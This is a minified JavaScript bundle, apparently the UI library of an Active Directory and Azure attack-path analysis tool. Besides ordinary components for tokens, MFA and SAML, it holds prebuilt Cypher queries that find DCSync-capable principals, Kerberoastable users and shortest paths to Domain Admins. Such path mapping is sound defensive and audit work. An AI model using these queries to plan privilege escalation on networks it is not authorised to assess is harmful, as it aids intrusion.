0)};return p(u,{children:[h(v,{maxHeight:"300px",overflow:"auto",children:h(Z,{dense:!0,disablePadding:!0,children:e.map((e=>{const{subheader:r,lineItems:n}=e;return p(v,{children:[p(Q,{sx:{fontWeight:"bold"},children:[r," "]}),n?.map(((e,r)=>{const{id:n,description:a,cypher:s,canEdit:c=!1}=e;return h(q,{disablePadding:!0,secondaryAction:c&&h(m,{"aria-label":"Delete Query",size:"small",onClick:()=>{i(n),o(!0)},children:h(b,{fontSize:"small",children:h(oe,{icon:Ee})})}),children:h(ee,{onClick:()=>t(s),children:h(Y,{primary:a})})},`${n}-${r}`)}))]},r)}))})}),p(C,{open:n,onClose:c,maxWidth:"xs",fullWidth:!0,children:[h(P,{children:"Delete Query"}),h(D,{children:h(R,{children:"Are you sure you want to delete this query?"})}),p(O,{children:[h(T,{color:"inherit",onClick:c,children:"Cancel"}),h(T,{onClick:()=>{r&&r(a),c()},color:"primary",autoFocus:!0,children:"Confirm"})]})]})]})},Ln={all:["savedQueries"]},Wn=e=>Sn.getUserSavedQueries(e).then((e=>e.data.data)),Fn=(e,t)=>Sn.createUserQuery(e,t).then((e=>e.data.data)),zn=e=>Sn.deleteUserQuery(e).then((e=>e.data)),Bn=()=>qe(Ln.all,(({signal:e})=>Wn({signal:e}))),Vn=()=>{const e=Ye();return Je(Fn,{onSuccess:()=>{e.invalidateQueries(Ln.all)}})},Kn=()=>{const e=Ye();return Je(zn,{onSuccess:()=>{e.invalidateQueries(Ln.all)}})},Hn=({clickHandler:e})=>{const t=Bn(),r=Kn(),{addNotification:n}=ct();if(t.isLoading)return h(v,{mt:2,children:h(W,{})});if(t.isError)return h(v,{my:2,ml:2,children:h(A,{children:"Unable to list saved queries."})});const o=t.data?.map((e=>({description:e.name,cypher:e.query,canEdit:!0,id:e.id})))||[];return o.length>0?h(_n,{listSections:[{subheader:"User Saved Searches: ",lineItems:o}],clickHandler:e,deleteHandler:e=>r.mutate(e,{onSuccess:()=>{n("Query deleted.","userDeleteQuery")}})}):h(v,{my:2,ml:2,children:h(A,{variant:"body2",children:"No queries have been saved yet."})})},Zn=e=>({h1:({children:e})=>h(A,{variant:"h1",style:{margin:"1rem 0"},children:e}),h2:({children:e})=>h(A,{variant:"h2",style:{margin:"1rem 0"},children:e}),h3:({children:e})=>h(A,{variant:"h3",style:{margin:"1rem 0"},children:e}),h4:({children:e})=>h(A,{variant:"h4",style:{margin:"1rem 0"},children:e}),h5:({children:e})=>h(A,{variant:"h5",style:{margin:"1rem 0"},children:e}),h6:({children:e})=>h(A,{variant:"h6",style:{margin:"1rem 0"},children:e}),a:({node:e,...t})=>h(S,{to:"#",color:"primary",target:"_blank",rel:"noopener noreferrer",...t}),blockquote:({node:e,...t})=>h("blockquote",{style:{margin:"1rem 0"},...t}),code:({node:e,inline:t,...r})=>h("code",{component:"code",style:{backgroundColor:"#e1e1e1",borderRadius:"4px",padding:t?"0 0.25em":"0"},...r}),em:({node:e,...t})=>h("em",{...t}),hr:({node:e,...t})=>h(I,{...t}),img:({node:t,...r})=>{const n=e?`${e}${r.src}`:r.src;return h("img",{...r,alt:r.alt,src:n,style:{maxWidth:"100%"}})},li:({node:e,ordered:t,...r})=>h("li",{...r}),ol:({node:e,ordered:t,...r})=>h("ol",{style:{paddingLeft:"1em",marginBottom:"1em"},...r}),p:({node:e,...t})=>h("p",{style:{margin:"1rem 0"},...t}),pre:({node:e,...t})=>h("pre",{style:{fontSize:"0.875rem",backgroundColor:"#e1e1e1",padding:"1rem",borderRadius:"4px",overflow:"auto",margin:"1rem 0"},...t}),strong:({node:e,...t})=>h("strong",{...t}),ul:({node:e,ordered:t,...r})=>h("ul",{style:{paddingLeft:"1em",marginBottom:"1em"},...r})}),qn=({url:e,baseURL:t,markdown:r=!1,fallback:n="An error has occurred."})=>{const[o,a]=s(!1),[c,d]=s(void 0),[l,p]=s(void 0);return i((()=>{a(!0),d(""),fetch(e).then((e=>e.text())).then((e=>{p(e),d("")})).catch((e=>{p(void 0),d(e)})).finally((()=>{a(!1)}))}),[e]),o?h(W,{}):c||"<"===l?.charAt(0)?h("p",{style:{margin:"1rem 0"},children:n}):r?h(Qe,{components:Zn(t),children:l}):h("div",{children:Xe.sanitize(l)})},Yn=Le({paper:{border:"1px solid #d3d4d5"}})((e=>h(K,{elevation:0,anchorOrigin:{vertical:"bottom",horizontal:"right"},transformOrigin:{vertical:"top",horizontal:"right"},...e}))),Jn=({SAMLProviderId:e,onDeleteSAMLProvider:t})=>{const[n,o]=r.useState(null);return p("div",{children:[h(m,{onClick:e=>{o(e.currentTarget)},size:"large",children:h(oe,{icon:$e})}),h(Yn,{anchorEl:n,keepMounted:!0,open:Boolean(n),onClose:()=>{o(null)},children:p(te,{onClick:()=>{t(e),o(null)},children:[h(re,{children:h(oe,{icon:Ee})}),h(Y,{primary:"Delete SAML Provider"})]})})]})},Xn=({SAMLProviders:e,loading:t,onDeleteSAMLProvider:r})=>h(f,{children:h(E,{children:p($,{children:[h(N,{children:p(U,{children:[h(_,{children:"Provider Name"}),h(_,{children:"IdP SSO URL"}),h(_,{children:"BHE SSO URL"}),h(_,{children:"BHE ACS URL"}),h(_,{children:"BHE Metadata URL"}),h(_,{})]})}),h(L,{children:t?p(U,{children:[h(_,{children:h(W,{})}),h(_,{children:h(W,{})}),h(_,{children:h(W,{})}),h(_,{children:h(W,{})}),h(_,{children:h(W,{})}),h(_,{children:h(W,{})})]}):0===e.length?h(U,{children:h(_,{colSpan:6,align:"center",children:"No SAML Providers found"})}):e.map(((e,t)=>p(U,{children:[h(_,{children:e?.name}),h(_,{children:e?.idp_sso_uri}),h(_,{children:e?.sp_sso_uri}),h(_,{children:e?.sp_acs_uri}),h(_,{children:e?.sp_metadata_uri}),h(_,{align:"right",children:h(Jn,{SAMLProviderId:e.id,onDeleteSAMLProvider:r})})]},t)))})]})})}),Qn=({item:e,index:t,highlightedIndex:r,keyword:n,getItemProps:o})=>h(q,{button:!0,dense:!0,selected:!!r&&r===t,"data-testid":"explore_search_result-list-item",...o({item:e,index:t}),children:h(Y,{primary:p(v,{style:{width:"100%",display:"flex",alignItems:"center"},children:[h(hn,{nodeType:e.kind}),h(v,{style:{flexGrow:1,marginRight:"1em"},children:h($r,{text:e.label||e.objectId,search:n})})]}),primaryTypographyProps:{style:{whiteSpace:"nowrap",verticalAlign:"center"}}})},e.objectId),eo=()=>qe("available-domains",(()=>Sn.getAvailableDomains().then((e=>e.data.data)))),to=(e,t)=>{i((()=>{const r=r=>{e.current&&!e.current.contains(r.target)&&t(r)};return document.addEventListener("mousedown",r),document.addEventListener("touchstart",r),()=>{document.removeEventListener("mousedown",r),document.removeEventListener("touchstart",r)}}),[e,t])},ro="Search Current Results",no="No result found in current results",oo=({sx:e,currentNodes:t,onSelect:r,onClose:n})=>{const o=c(null),a=c(null),[d,l]=s([]),[u,m]=s([]),[b,y]=s(null),[g,w]=s(0);i((()=>{const e=Object.entries(t).map((([e,t])=>({id:e,...t})));l(e)}),[t]),i((()=>a.current?.focus()),[]),i((()=>{b&&r(b)}),[b,r]),i((()=>{const e=38*u.length;w(e>350?340:e)}),[u]),to(o,(()=>n&&n()));const{getInputProps:A,getMenuProps:S,getComboboxProps:T,getItemProps:k,inputValue:C}=et({items:u,onInputValueChange:({inputValue:e})=>{const t=d.filter((t=>{const r=t.label.toLowerCase(),n=t.objectId.toLowerCase(),o=e?.toLowerCase()||"";return""!==e&&(r.includes(o)||n.includes(o))}));m(t)},stateReducer:(e,t)=>{const{changes:r,type:n}=t;return n===et.stateChangeTypes.ItemClick?(r.selectedItem&&y(r.selectedItem),{...r,inputValue:""}):r}});return h("div",{ref:o,children:p(v,{component:f,...e,...T(),children:[h(v,{overflow:"auto",maxHeight:350,marginBottom:0===u.length?0:1,children:p(Z,{"data-testid":"current-results-list",dense:!0,...S({hidden:0===u.length&&!C,style:{paddingTop:0}}),children:[h(Ve,{height:g,width:"100%",itemSize:38,itemCount:u.length,children:({index:e,style:t})=>h(v,{style:t,overflow:"hidden",children:h(Qn,{item:u[e],index:e,highlightedIndex:0,keyword:C,getItemProps:k},e)})}),0===u.length&&C&&h(q,{disabled:!0,sx:{fontSize:14},children:no})]})}),h(G,{inputRef:a,placeholder:ro,variant:"outlined",size:"small",fullWidth:!0,...A(),InputProps:{sx:{fontSize:14}}})]})})},ao=({text:e,fallback:t})=>"string"!=typeof e||""===e.trim()?h("em",{children:t}):h(u,{children:e}),io=({open:e,onCancel:t,onSubmit:r})=>{const{control:n,handleSubmit:o,formState:{errors:a}}=Ue({defaultValues:{token_name:""}});return p(C,{"aria-labelledby":"createUserTokenDialogTitle",open:e,fullWidth:!0,maxWidth:"sm",onClose:t,PaperProps:{"data-testid":"create-user-token-dialog"},children:[h(P,{id:"createUserTokenDialogTitle",children:"Create User Token"}),p("form",{autoComplete:"off",onSubmit:o(r),children:[h(D,{children:h(x,{container:!0,spacing:1,children:h(_e,{name:"token_name",control:n,defaultValue:"",rules:{required:"Token name is required"},render:({field:e})=>h(G,{...e,variant:"standard",label:"Token Name",fullWidth:!0,error:!!a.token_name,helperText:a.token_name?.message,"data-testid":"create-user-token-dialog_input-token-name"})})})}),p(O,{children:[h(T,{autoFocus:!0,color:"inherit",onClick:e=>{e.preventDefault(),t()},"data-testid":"create-user-token-dialog_button-close",children:"Cancel"}),h(T,{color:"primary",type:"submit","data-testid":"create-user-token-dialog_button-save",children:"Save"})]})]})]})},so=({open:e,token:t,onClose:r})=>p(C,{open:e,fullWidth:!0,maxWidth:"sm",PaperProps:{"data-testid":"user-token-dialog"},children:[h(P,{children:"Auth Token"}),p(D,{children:[h(R,{children:"Below is the new authentication token. Make sure to save this key, it will not be displayed again."}),p(R,{variant:"body2",children:["Key: ",t?.key,h("br",{}),"ID: ",t?.id]})]}),h(O,{children:h(T,{color:"inherit",onClick:r,"data-testid":"user-token-dialog_button-close",children:"Close"})})]}),co=({open:e,onCancel:t,onConfirm:r,token:n})=>p(C,{open:e,fullWidth:!0,maxWidth:"xs",PaperProps:{"data-testid":"token-revoke-dialog"},children:[p(P,{children:['Revoke "',n?.name,'" Auth Token']}),p(D,{children:[h(R,{children:"Are you sure you want to revoke the permanent token? Applications using this token will be unable to contact the API."}),p(O,{children:[h(T,{color:"inherit",onClick:t,"data-testid":"token-revoke-dialog_button-close",children:"Cancel"}),h(T,{onClick:r,"data-testid":"token-revoke-dialog_button-save",children:"Confirm"})]})]})]}),lo=Fe({revokeButton:{padding:"0","& .MuiButton-label":{padding:0,justifyContent:"left"}}}),ho=({open:e,onClose:t,userId:r})=>{const{isLoading:n,isIdle:o,error:a,data:i,refetch:c}=qe(["getUserTokens",r],(({signal:e})=>Sn.getUserTokens(r,{signal:e})),{enabled:!!e}),{addNotification:d}=ct(),l=lo(),[m,b]=s(!1),[y,g]=s(!1),[w,f]=s(void 0),[v,S]=s(!1),k=()=>{f(void 0),g(!1),S(!1)};return p(u,{children:[p(C,{open:e,fullWidth:!0,maxWidth:"md",onClose:t,PaperProps:{"data-testid":"user-token-management-dialog"},children:[h(P,{children:"Generate/Revoke API Tokens"}),p(D,{children:[h(R,{children:"Permanent Authentication Tokens are used for authenticating API calls. Tokens never expire and will remain valid until revoked. Ensure tokens are stored securely."}),h(A,{variant:"h6",children:"Existing Tokens"}),p($,{"data-testid":"user-token-management-dialog_table",children:[h(N,{children:p(U,{children:[h(_,{children:"Description"}),h(_,{children:"Created"}),h(_,{children:"Last Use"}),h(_,{children:"Actions"})]})}),h(L,{children:(()=>{if(n||o)return h(U,{children:h(_,{colSpan:4,children:h(H,{})})});if(a)return h(U,{children:h(_,{children:h("div",{children:"Error loading user tokens"})})});{const e=i?.data.data.tokens||[];return 0===e.length?h(U,{children:h(_,{colSpan:4,align:"center",children:"No tokens available"})}):e.map((e=>p(U,{children:[h(_,{component:"th",scope:"row",children:e.name}),h(_,{children:We.fromISO(e.created_at).toFormat($t.DATETIME)}),h(_,{children:We.fromISO(e.last_access).toFormat($t.DATETIME)}),h(_,{children:h(T,{variant:"text",color:"secondary",className:l.revokeButton,onClick:()=>(f(e),void S(!0)),children:"Revoke"})})]},`${e.id}`)))}})()})]})]}),p(O,{children:[h(T,{autoFocus:!0,color:"inherit",onClick:t,"data-testid":"user-token-management-dialog_button-close",children:"Close"}),h(T,{color:"primary",type:"submit",onClick:()=>b(!0),"data-testid":"user-token-management-dialog_button-save",children:"Create Token"})]})]}),m&&h(io,{open:m,onCancel:()=>b(!1),onSubmit:async e=>{b(!1);try{const{data:{data:t}}=await Sn.createUserToken(r,e.token_name);f(t),g(!0)}catch(e){console.error(e),d(`Error creating token: ${e}:`,"ErrorCreateToken")}await c()}}),y&&h(so,{open:y,onClose:k,token:w}),v&&h(co,{open:v,onCancel:()=>S(!1),onConfirm:async()=>{if(null!=w){try{await Sn.deleteUserToken(w.id)}catch(e){console.error(e),d(`Error deleting token: ${e}:`,"ErrorDeleteToken")}await c(),k()}},token:w})]})},po="Active Directory",uo="Azure",mo=nn().slice(0,-1).join("|")+nn().slice(-1),bo=Qr().slice(0,-1).join("|")+"|"+Qr().slice(-1),yo="Global Administrator.*|User Administrator.*|Cloud Application Administrator.*|Authentication Policy Administrator.*|Exchange Administrator.*|Helpdesk Administrator.*|Privileged Authentication Administrator.*",go=[{subheader:"Domain Information",category:po,queries:[{description:"All Domain Admins",cypher:'MATCH p=(n:Group)<-[:MemberOf*1..]-(m)\nWHERE n.objectid ENDS WITH "-512"\nRETURN p'},{description:"Map domain trusts",cypher:"MATCH p=(n:Domain)-[]->(m:Domain)\nRETURN p"},{description:"Computers with unsupported operating systems",cypher:'MATCH (n:Computer)\nWHERE n.operatingsystem =~ "(?i).*Windows.* (2000|2003|2008|2012|xp|vista|7|8|me|nt).*"\nRETURN n'},{description:"Locations of high value/Tier Zero objects",cypher:'MATCH p = (:Domain)-[:Contains*1..]->(n:Base)\nWHERE n.system_tags="admin_tier_0"\nRETURN p'}]},{subheader:"Dangerous Privileges",category:po,queries:[{description:"Principals with DCSync privileges",cypher:"MATCH p=()-[:DCSync|AllExtendedRights|GenericAll]->(:Domain)\nRETURN p"},{description:"Users with foreign domain group membership",cypher:"MATCH p=(n:User)-[:MemberOf]->(m:Group)\nWHERE m.domainsid<>n.domainsid\nRETURN p"},{description:"Groups with foreign domain group membership",cypher:"MATCH p=(n:Group)-[:MemberOf]->(m:Group)\nWHERE m.domainsid<>n.domainsid AND n.name<>m.name\nRETURN p"},{description:"Computers where Domain Users are local administrators",cypher:'MATCH p=(m:Group)-[:AdminTo]->(n:Computer)\nWHERE m.objectid ENDS WITH "-513"\nRETURN p'},{description:"Computers where Domain Users can read LAPS passwords",cypher:'MATCH p=(m:Group)-[:AllExtendedRights|ReadLAPSPassword]->(n:Computer)\nWHERE m.objectid ENDS WITH "-513"\nRETURN p'},{description:"Paths from Domain Users to high value/Tier Zero targets",cypher:`MATCH p=shortestPath((m:Group)-[:${bo}*1..]->(n))\nWHERE n.system_tags="admin_tier_0" AND m.objectid ENDS WITH "-513" AND m<>n\nRETURN p`},{description:"Workstations where Domain Users can RDP",cypher:'MATCH p=(m:Group)-[:CanRDP]->(c:Computer)\nWHERE m.objectid ENDS WITH "-513" AND NOT c.operatingsystem CONTAINS "Server"\nRETURN p'},{description:"Servers where Domain Users can RDP",cypher:'MATCH p=(m:Group)-[:CanRDP]->(c:Computer)\nWHERE m.objectid ENDS WITH "-513" AND c.operatingsystem CONTAINS "Server"\nRETURN p'},{description:"Dangerous privileges for Domain Users groups",cypher:'MATCH p=(m:Group)-[:Owns|WriteDacl|GenericAll|WriteOwner|ExecuteDCOM|GenericWrite|AllowedToDelegate|ForceChangePassword]->(n:Computer)\nWHERE m.objectid ENDS WITH "-513"\nRETURN p'},{description:"Domain Admins logons to non-Domain Controllers",cypher:"MATCH (dc)-[r:MemberOf*0..]->(g:Group)\nWHERE g.objectid ENDS WITH '-516'\nWITH COLLECT(dc) AS exclude\nMATCH p = (c:Computer)-[n:HasSession]->(u:User)-[r2:MemberOf*1..]->(g:Group)\nWHERE g.objectid ENDS WITH '-512' AND NOT c IN exclude\nRETURN p"}]},{subheader:"Kerberos Interaction",category:po,queries:[{description:"Kerberoastable members of high value/Tier Zero groups",cypher:'MATCH p=shortestPath((n:User)-[:MemberOf]->(g:Group))\nWHERE g.system_tags = "admin_tier_0" AND n.hasspn=true\nRETURN p'},{description:"All Kerberoastable users",cypher:"MATCH (n:User)\nWHERE n.hasspn=true\nRETURN n"},{description:"Kerberoastable users with most privileges",cypher:"MATCH (u:User {hasspn:true})\nOPTIONAL MATCH (u)-[:AdminTo]->(c1:Computer)\nOPTIONAL MATCH (u)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c2:Computer)\nWITH u,COLLECT(c1) + COLLECT(c2) AS tempVar\nUNWIND tempVar AS comps\nRETURN u"},{description:"AS-REP Roastable users (DontReqPreAuth)",cypher:"MATCH (u:User)\nWHERE u.dontreqpreauth = true\nRETURN u"}]},{subheader:"Shortest Paths",category:po,queries:[{description:"Shortest paths to systems trusted for unconstrained delegation",cypher:`MATCH p=shortestPath((n)-[:${bo}*1..]->(m:Computer))\nWHERE m.unconstraineddelegation = true AND n<>m\nRETURN p`},{description:"Shortest paths from Kerberoastable users",cypher:`MATCH p=shortestPath((n:User)-[:${bo}*1..]->(m:Computer))\nWHERE n.hasspn = true AND n<>m\nRETURN p`},{description:"Shortest paths to Domain Admins from Kerberoastable users",cypher:`MATCH p=shortestPath((n:User)-[:${bo}*1..]->(m:Group))\nWHERE n.hasspn = true AND m.objectid ENDS WITH "-512"\nRETURN p`},{description:"Shortest paths to high value/Tier Zero targets",cypher:`MATCH p=shortestPath((n)-[:${bo}*1..]->(m))\nWHERE m.system_tags = "admin_tier_0" AND n<>m\nRETURN p`},{description:"Shortest paths from Domain Users to high value/Tier Zero targets",cypher:`MATCH p=shortestPath((n:Group)-[:${bo}*1..]->(m))\nWHERE m.system_tags = "admin_tier_0" AND n.objectid ENDS WITH "-513" AND n<>m\nRETURN p`},{description:"Shortest paths to Domain Admins",cypher:`MATCH p=shortestPath((n)-[:${bo}*1..]->(g:Group))\nWHERE g.objectid ENDS WITH "-512" AND n<>g\nRETURN p`}]},{subheader:"General",category:uo,queries:[{description:"All Global Administrators",cypher:"MATCH p = (n)-[r:AZGlobalAdmin*1..]->(m)\nRETURN p"},{description:"All members of high privileged roles",cypher:`MATCH p=(n)-[:AZHasRole|AZMemberOf*1..2]->(r:AZRole)\nWHERE r.name =~ '(?i)${yo}'\nRETURN p`}]},{subheader:"Shortest Paths",category:uo,queries:[{description:"Shortest paths to high value/Tier Zero targets",cypher:`MATCH p=shortestPath((m:AZUser)-[r:${mo}*1..]->(n))\nWHERE n.system_tags = "admin_tier_0" AND n.name =~ '(?i)${yo}' AND m<>n\nRETURN p`},{description:"Shortest paths to privileged roles",cypher:`MATCH p=shortestPath((m)-[r:${mo}*1..]->(n:AZRole))\nWHERE n.name =~ '(?i)${yo}' AND m<>n\nRETURN p`},{description:"Shortest paths from Azure Applications to high value/Tier Zero targets",cypher:`MATCH p=shortestPath((m:AZApp)-[r:${mo}*1..]->(n))\nWHERE n.system_tags = "admin_tier_0" AND m<>n\nRETURN p`},{description:"Shortest paths to Azure Subscriptions",cypher:`MATCH p=shortestPath((m)-[r:${mo}*1..]->(n:AZSubscription))\nWHERE m<>n\nRETURN p`}]},{subheader:"Microsoft Graph",category:uo,queries:[{description:"All service principals with Microsoft Graph privilege to grant arbitrary App Roles",cypher:"MATCH p=(n)-[r:AZMGGrantAppRoles]->(o:AZTenant)\nRETURN p"},{description:"All service principals with Microsoft Graph App Role assignments",cypher:"MATCH p=(m:AZServicePrincipal)-[r:AZMGAppRoleAssignment_ReadWrite_All|AZMGApplication_ReadWrite_All|AZMGDirectory_ReadWrite_All|AZMGGroupMember_ReadWrite_All|AZMGGroup_ReadWrite_All|AZMGRoleManagement_ReadWrite_Directory|AZMGServicePrincipalEndpoint_ReadWrite_All]->(n:AZServicePrincipal)\nRETURN p"}]}],wo=()=>{const{addNotification:e}=ct(),[t,r]=s(!1),[n,o]=s(!1),[a,i]=s(!1),[c,d]=s(!1),[l,m]=s(""),[b,y]=s(""),[g,w]=s(""),[f,S]=s(""),[k,C]=s(""),P=qe(["getSelf"],(({signal:e})=>Sn.getSelf({signal:e}).then((e=>e.data.data)))),D=Je((({userId:e,secret:t,needsPasswordReset:r})=>Sn.putUserAuthSecret(e,{needs_password_reset:r,secret:t})),{onSuccess:()=>{e("Password updated successfully!","updateUserPasswordSuccess"),r(!1)}});if(P.isLoading)return p(An,{title:"My Profile","data-testid":"my-profile",children:[h(A,{variant:"h2",children:"User Information"}),h(v,{p:4,textAlign:"center",children:h(X,{})})]});if(P.isError)return p(An,{title:"My Profile","data-testid":"my-profile",children:[h(A,{variant:"h2",children:"User Information"}),p(j,{severity:"error",children:[h(V,{children:"Error"}),"Sorry, there was a problem fetching your user information.",h("br",{}),"Please try refreshing the page or logging in again."]})]});const R=P.data;return p(u,{children:[p(An,{title:"My Profile","data-testid":"my-profile",children:[h(A,{variant:"h2",children:"User Information"}),p(x,{container:!0,spacing:2,alignItems:"center",children:[h(x,{item:!0,xs:3,children:h(A,{variant:"body1",children:"Email"})}),h(x,{item:!0,xs:9,children:h(A,{variant:"body1",children:R?.email_address})}),h(x,{item:!0,xs:3,children:h(A,{variant:"body1",children:"Name"})}),h(x,{item:!0,xs:9,children:h(A,{variant:"body1",children:h(ao,{text:$n(R),fallback:"Unknown"})})}),h(x,{item:!0,xs:3,children:h(A,{variant:"body1",children:"Role"})}),h(x,{item:!0,xs:9,children:h(A,{variant:"body1",children:h(ao,{text:R?.roles?.[0]?.name,fallback:"Unknown"})})})]}),h(v,{mt:2,children:h(A,{variant:"h2",children:"Authentication"})}),p(x,{container:!0,spacing:2,alignItems:"center",children:[p(x,{container:!0,item:!0,children:[h(x,{item:!0,xs:3,children:h(A,{variant:"body1",children:"API Key Management"})}),h(x,{item:!0,xs:2,children:h(T,{variant:"contained",color:"primary",size:"small",disableElevation:!0,fullWidth:!0,onClick:()=>o(!0),"data-testid":"my-profile_button-api-key-management",children:"API Key Management"})})]}),null===R.saml_provider_id&&p(u,{children:[p(x,{container:!0,item:!0,children:[h(x,{item:!0,xs:3,children:h(A,{variant:"body1",children:"Password"})}),h(x,{item:!0,xs:2,children:h(T,{variant:"contained",color:"primary",size:"small",disableElevation:!0,fullWidth:!0,onClick:()=>r(!0),"data-testid":"my-profile_button-reset-password",children:"Reset Password"})})]}),p(x,{container:!0,item:!0,children:[h(x,{item:!0,xs:3,children:h(A,{variant:"body1",children:"Multi-Factor Authentication"})}),h(x,{item:!0,xs:9,children:p(v,{display:"flex",alignItems:"center",children:[h(ne,{inputProps:{"aria-label":"Multi-Factor Authentication Enabled"},checked:R.AuthSecret?.totp_activated,onChange:()=>{R.AuthSecret?.totp_activated?d(!0):i(!0)},color:"primary","data-testid":"my-profile_switch-multi-factor-authentication"}),R.AuthSecret?.totp_activated&&h(A,{variant:"body1",children:"Enabled"})]})})]})]})]})]}),h(Un,{open:t,onClose:()=>r(!1),userId:R.id,showNeedsPasswordReset:!1,onSave:D.mutate}),h(ho,{open:n,onClose:()=>o(!1),userId:R.id}),h(Ct,{open:a,onClose:()=>{i(!1),w(""),C(""),P.refetch()},onCancel:()=>{i(!1),w(""),C(""),P.refetch()},onSavePassword:e=>(w(""),Sn.enrollMFA(R.id,{secret:e}).then((e=>{y(e.data.data.qr_code),m(e.data.data.totp_secret),w("")})).catch((e=>{throw w("Unable to verify password. Please try again."),e}))),onSaveOTP:e=>(w(""),Sn.activateMFA(R.id,{otp:e}).then((()=>{w("")})).catch((e=>{throw w("Unable to verify one-time password. Please try again."),e}))),onSave:()=>{i(!1),w(""),P.refetch()},TOTPSecret:l,QRCode:b,error:g}),h(St,{open:c,onClose:()=>{d(!1),S(""),P.refetch()},onCancel:()=>{d(!1),S(""),P.refetch()},onSave:e=>{S(""),Sn.disenrollMFA(R.id,{secret:e}).then((()=>{d(!1),S(""),C(""),P.refetch()})).catch((()=>{S("Unable to verify password. Please try again.")}))},error:f,secret:k,onSecretChange:e=>C(e.target.value),contentText:"To stop using multi-factor authentication, please enter your password for security purposes."})]})},fo={data:"Relationship Information",general:"General",abuse:"Abuse",windowsAbuse:"Windows Abuse",linuxAbuse:"Linux Abuse",opsec:"OPSEC",references:"References"},vo={open:!1,selectedEdge:null,expandedSections:{data:!0,general:!1,abuse:!1,windowsAbuse:!1,linuxAbuse:!1,opsec:!1,references:!1}},Ao=tt({name:"edgeinfo",initialState:vo,reducers:{setEdgeInfoOpen:(e,t)=>{e.open=t.payload},setSelectedEdge:(e,t)=>{e.selectedEdge=t.payload,Object.entries(e.expandedSections).forEach((t=>{const r=t[0];"data"===t[0]?e.expandedSections[r]=!0:e.expandedSections[r]=!1}))},edgeSectionToggle:(e,t)=>{e.open=!0,e.expandedSections[t.payload.section]=t.payload.expanded},collapseAllSections:e=>{Object.entries(e.expandedSections).forEach((t=>{const r=t[0];e.expandedSections[r]=!1}))}}}),{setEdgeInfoOpen:So,setSelectedEdge:To,edgeSectionToggle:ko,collapseAllSections:Co}=Ao.actions;var Po=Ao.reducer;export{Cn as ADSpecificTimeProperties,zr as ActiveDirectoryKindProperties,Xr as ActiveDirectoryKindPropertiesToDisplay,Wr as ActiveDirectoryNodeKind,Yr as ActiveDirectoryNodeKindToDisplay,Qr as ActiveDirectoryPathfindingEdges,Fr as ActiveDirectoryRelationshipKind,Jr as ActiveDirectoryRelationshipKindToDisplay,lt as AppNotifications,Kr as AzureKindProperties,rn as AzureKindPropertiesToDisplay,Br as AzureNodeKind,en as AzureNodeKindToDisplay,nn as AzurePathfindingEdges,Vr as AzureRelationshipKind,tn as AzureRelationshipKindToDisplay,pt as CheckboxGroup,mt as CollectorCard,yt as CollectorCardList,Zr as CommonKindProperties,an as CommonKindPropertiesToDisplay,Hr as CommonNodeKind,on as CommonNodeKindToDisplay,go as CommonSearches,gt as ConfirmationDialog,wt as ContentPage,vt as CreateSAMLProviderDialog,ft as CreateSAMLProviderForm,At as DataTable,St as Disable2FADialog,Er as EdgeInfoComponents,fo as EdgeSections,Ct as Enable2FADialog,Dt as FileStatus,xt as FileUploadDialog,Gt as FileUploadJobStatus,jt as FileUploadJobStatusToString,Rt as FileUploadStep,Lt as FinishedIngestLog,cn as GLYPHS,Wt as GenericErrorBoundaryFallback,qr as GlyphKind,zt as GraphButton,Bt as GraphMenu,Kt as GraphProgress,$r as HighlightedText,_r as Icon,bn as InfiniteScrollingTable,Et as LUXON_DATETIME_REGEX,yn as LoadingOverlay,$t as LuxonFormat,wn as MenuItem,sn as NODE_ICON,no as NO_RESULTS_TEXT,fn as NoDataAlert,hn as NodeIcon,st as NotificationsProvider,vn as OneTimePasscodeForm,En as PASSWD_REQS,ro as PLACEHOLDER_TEXT,An as PageWithTitle,Un as PasswordDialog,Hn as PersonalSearchList,_n as PrebuiltSearchList,qn as RemoteContent,Xn as SAMLProviderTable,Jn as SAMLProviderTableActionMenu,oo as SearchCurrentNodes,Qn as SearchResultItem,Tt as SetupKeyDialog,ao as TextWithFallback,dn as UNKNOWN_ICON,wo as UserProfile,ho as UserTokenManagementDialog,Sn as apiClient,Nt as calculateJobDuration,Co as collapseAllSections,Fn as createSavedQuery,zn as deleteSavedQuery,Tn as downloadFile,Ao as edgeInfoSlice,ko as edgeSectionToggle,Po as edgeinfo,kn as exportToJson,xn as format,Pn as formatADSpecificTime,Rn as formatBoolean,In as formatList,Dn as formatNumber,On as formatString,Wn as getSavedQueries,$n as getUsername,vo as initialState,Gn as passwordRegex,Ln as savedQueryKeys,So as setEdgeInfoOpen,To as setSelectedEdge,jn as testPassword,eo as useAvailableDomains,Vn as useCreateSavedQuery,Kn as useDeleteSavedQuery,ct as useNotifications,to as useOnClickOutside,Bn as useSavedQueries};
//# sourceMappingURL=index.js.map
